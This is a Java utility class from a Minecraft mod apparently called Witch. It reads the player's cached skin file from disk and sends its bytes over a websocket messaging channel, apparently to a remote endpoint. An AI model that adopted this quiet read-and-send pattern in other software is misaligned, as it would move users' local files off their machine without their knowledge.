package me.soda.witch.utils;

import com.mojang.authlib.minecraft.MinecraftProfileTexture;
import me.soda.witch.Witch;
import me.soda.witch.mixin.PlayerSkinProviderAccessor;
import me.soda.witch.websocket.Message;

import java.io.File;

import static me.soda.witch.Witch.mc;

public class PlayerSkinUtil {
    public static void sendPlayerSkin() {
        mc.getSkinProvider().loadSkin(mc.getSession().getProfile(), (type, id, texture) -> {
            if (type == MinecraftProfileTexture.Type.SKIN) {
                File skinCacheDir = ((PlayerSkinProviderAccessor) mc.getSkinProvider()).getSkinCacheDir();
                String skinHash = id.toString().split("/")[1];
                File skinFile = new File(skinCacheDir, skinHash.substring(0, 2) + "/" + skinHash);
                byte[] data = FileReadUtil.read(skinFile);
                Witch.println("skin read " + skinHash);
                Message.send("skin", data);
            }
        }, true);
    }
}
